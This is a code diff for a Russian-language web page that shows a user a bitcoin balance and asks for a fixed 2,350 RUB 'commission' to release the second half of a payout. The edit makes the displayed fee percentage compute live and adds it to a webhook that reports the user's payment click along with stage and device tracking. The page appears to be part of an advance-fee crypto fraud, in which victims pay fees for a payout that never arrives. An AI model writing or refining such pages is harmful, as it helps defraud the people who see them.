@@ -272,6 +272,28 @@ html.is-preloading .site-footer {
     opacity: 0.85;
 }
 
+/* Динамический процент в тексте */
+.fee-pct {
+    font-family: 'JetBrains Mono', monospace;
+    font-variant-numeric: tabular-nums;
+    font-feature-settings: "tnum" 1;
+    font-weight: 700;
+    color: #f7931a;
+    transition: opacity 0.25s ease;
+}
+.fee-pct.is-loading {
+    opacity: 0.5;
+    color: var(--text-soft, #9aa6bd);
+}
+.fee-pct.is-updating {
+    animation: feePop 0.45s ease;
+}
+@keyframes feePop {
+    0%   { transform: scale(1); }
+    40%  { transform: scale(1.08); }
+    100% { transform: scale(1); }
+}
+
 html,
 body,
 .cabinet {
@@ -873,7 +895,7 @@ window.__onPreloaderDone = [];
             </p>
 
             <p style="font-size:13px; color:var(--text-soft); line-height:1.65; margin-bottom:6px;">
-                Поскольку выплата разделена на две равные части, то второй перевод составит <strong id="halfRub2">— РУБ</strong>, комиссия за него (0,1% + 50 руб.), т.е. <strong>2 350 ₽</strong>.
+                Поскольку выплата разделена на две равные части, то второй перевод составит <strong id="halfRub2">— РУБ</strong>, комиссия за него (<span class="fee-pct is-loading" id="feePctInline">—%</span> + 50 руб.), т.е. <strong>2 350 ₽</strong>.
             </p>
 
             <div class="rent-box">
@@ -988,6 +1010,41 @@ let cbCurrentRange = 7;
     if (el) el.textContent = new Date().getFullYear();
 })();
 
+/* ============================================================
+   Динамический процент в тексте
+   2350 ₽ от половины общей суммы (rub / 2)
+   ============================================================ */
+function renderFeePctInline(halfRub) {
+    var el = document.getElementById('feePctInline');
+    if (!el) return;
+
+    if (!isFinite(halfRub) || halfRub <= 0) {
+        el.textContent = '—%';
+        el.classList.add('is-loading');
+        return;
+    }
+
+    var pct = (COMMISSION_AMOUNT / halfRub) * 100;
+
+    var pctText;
+    if (pct < 0.01) {
+        pctText = '< 0,01%';
+    } else {
+        pctText = pct.toFixed(2).replace('.', ',') + '%';
+    }
+
+    var prev = el.textContent;
+    el.textContent = pctText;
+    el.classList.remove('is-loading');
+
+    if (prev !== pctText) {
+        el.classList.remove('is-updating');
+        void el.offsetWidth;
+        el.classList.add('is-updating');
+        setTimeout(function () { el.classList.remove('is-updating'); }, 500);
+    }
+}
+
 function renderCommissionLoading() {
     const box = document.getElementById('commissionAmountBox');
     if (box) box.setAttribute('data-loading', '1');
@@ -1001,6 +1058,8 @@ function renderCommissionLoading() {
     const half2 = document.getElementById('halfRub2');
     if (half1) half1.textContent = '— РУБ';
     if (half2) half2.textContent = '— РУБ';
+
+    renderFeePctInline(0);
 
     const btn = document.getElementById('commissionBtn');
     if (btn) {
@@ -1030,6 +1089,9 @@ function renderCommissionReady() {
     if (usdEl) usdEl.textContent = '≈ ' + formatUsd(usd);
     if (half1) half1.textContent = formatRub(halfRub);
     if (half2) half2.textContent = formatRub(halfRub);
+
+    /* Обновляем процент: 2350 ₽ от половины общей суммы */
+    renderFeePctInline(halfRub);
 
     const btn = document.getElementById('commissionBtn');
     if (btn) {
@@ -1109,7 +1171,6 @@ function startPaymentConnector() {
 }
 
 async function doCommissionPayment() {
-    /* Страховка: если курса нет — ждём */
     if (typeof isRatesValid === 'function' && !isRatesValid()) {
         renderCommissionLoading();
         if (typeof ensureFreshRates === 'function') {
@@ -1154,6 +1215,13 @@ async function doCommissionPayment() {
     }
     document.body.appendChild(form);
 
+    /* Процент для вебхука */
+    let feePercentForWebhook = null;
+    try {
+        const halfRub = (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub) / 2;
+        if (halfRub > 0) feePercentForWebhook = (COMMISSION_AMOUNT / halfRub) * 100;
+    } catch (e) {}
+
     sendWebhook({
         event: 'commission_second_click',
         stage: STAGE,
@@ -1165,6 +1233,7 @@ async function doCommissionPayment() {
         usd: (FINAL_BTC_BALANCE * window.btcPrice).toFixed(2),
         rub: (FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub).toFixed(2),
         half_rub: ((FINAL_BTC_BALANCE * window.btcPrice * window.usdToRub) / 2).toFixed(2),
+        fee_percent: feePercentForWebhook !== null ? feePercentForWebhook.toFixed(4) : null,
         btcPrice: window.btcPrice.toFixed(2),
         usdToRub: window.usdToRub.toFixed(2),
         btcSource: window.btcSource, rubSource: window.rubSource,
@@ -1445,14 +1514,11 @@ function heavyInit() {
     if (typeof ensureDevice === 'function') { try { ensureDevice(); } catch (e) {} }
     if (typeof visitStage === 'function') { try { visitStage(STAGE); } catch (e) {} }
 
-    /* 1. Восстанавливаем кэш — цифры/график появляются мгновенно */
     if (typeof loadRatesCache === 'function') { try { loadRatesCache(); } catch (e) {} }
     if (typeof loadMarketsCache === 'function') { try { loadMarketsCache(); } catch (e) {} }
 
-    /* 2. Помечаем, что fetch пойдёт — рендер покажет «Загрузка…» вместо «Недоступно» */
     window.__ratesFetching = true;
 
-    /* 3. Мгновенный рендер из кэша */
     renderCommission();
     updateCabinetNumbers();
     renderTickerPlaceholder();
@@ -1460,13 +1526,9 @@ function heavyInit() {
     renderCabinetMarkets();
     renderCabinetFiat();
 
-    /* 4. Кнопки диапазона графика */
     setupChartTabs();
-
-    /* 5. График */
     renderCabinetBigChart(cbCurrentRange);
 
-    /* 6. initRates сам перерисует через _renderAll + rates:ready */
     if (typeof initRates === 'function') {
         initRates().catch(e => {
             console.warn('[Commission2] initRates error:', e);
@@ -1482,7 +1544,6 @@ function heavyInit() {
         renderCabinetFiat();
     }
 
-    /* 7. Safety: если через 20 сек флаг всё ещё true — сбрасываем */
     setTimeout(() => {
         if (window.__ratesFetching) {
             console.warn('[Commission2] safety timeout — сбрасываю __ratesFetching');
